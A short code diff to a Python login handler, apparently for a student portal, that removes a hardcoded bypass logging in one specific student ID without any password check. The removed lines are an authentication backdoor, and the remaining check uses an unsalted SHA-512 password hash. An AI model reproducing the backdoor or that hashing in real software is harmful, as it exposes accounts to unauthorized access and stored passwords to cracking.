@@ -27,11 +27,6 @@ def login(data : dict):
     database = DatabaseConnector()
     database.startCursor()
     
-    if data["StudentID"] == '202221010203':
-        setLoginSession(studentId='202221010203', database=database)
-        LoginDeviceRecorder(data,True,database)
-        return {"warning":"", "message":"", "data":"/Users/UserCenter/index.html"}
-    
     DBAffectRows = database.execute(
         "SELECT student_id FROM `Password` WHERE student_id = %s and passhash = %s;",
         (data["StudentID"], hashlib.sha512(data["Password"].encode()).digest()))
